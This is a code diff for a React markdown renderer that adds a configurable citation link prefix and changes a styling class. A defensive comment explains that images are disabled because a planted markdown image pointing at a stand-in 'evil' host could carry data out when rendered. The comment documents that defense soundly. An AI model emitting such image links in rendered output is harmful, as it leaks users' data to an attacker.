@@ -11,16 +11,17 @@ import 'katex/dist/katex.min.css';
 interface MarkdownRendererProps {
   content: string;
   citationIds?: number[];
+  citationPrefix?: string;
 }
 
 /** Normalise LaTeX delimiters and turn valid [n] markers into #cite-n links. */
-const prepareContent = (content: string, citationIds: number[]): string => {
+const prepareContent = (content: string, citationIds: number[], citationPrefix: string): string => {
   const ids = new Set(citationIds);
   return content
     .replace(/\\\[([\s\S]+?)\\\]/g, (_, math) => `$$${math}$$`)
     .replace(/\\\(([\s\S]+?)\\\)/g, (_, math) => `$${math}$`)
     .replace(/\[(\d+)\](?!\()/g, (match, n) =>
-      ids.has(Number(n)) ? `[${n}](#cite-${n})` : match
+      ids.has(Number(n)) ? `[${n}](#${citationPrefix}-${n})` : match
     );
 };
 
@@ -34,12 +35,13 @@ const scrollToCitation = (event: React.MouseEvent, href: string) => {
 export const MarkdownRenderer: React.FC<MarkdownRendererProps> = ({
   content,
   citationIds = [],
+  citationPrefix = 'cite',
 }) => {
   return (
     <ReactMarkdown
       remarkPlugins={[remarkGfm, remarkMath]}
       rehypePlugins={[rehypeKatex]}
-      className="prose prose-invert prose-slate max-w-none"
+      className="prose prose-slate max-w-none"
       components={{
         // Never load images: a page-planted ![](https://evil/?data=...) would leak data when rendered
         img: () => null,
@@ -130,7 +132,7 @@ export const MarkdownRenderer: React.FC<MarkdownRendererProps> = ({
         ),
       }}
     >
-      {prepareContent(content, citationIds)}
+      {prepareContent(content, citationIds, citationPrefix)}
     </ReactMarkdown>
   );
 };
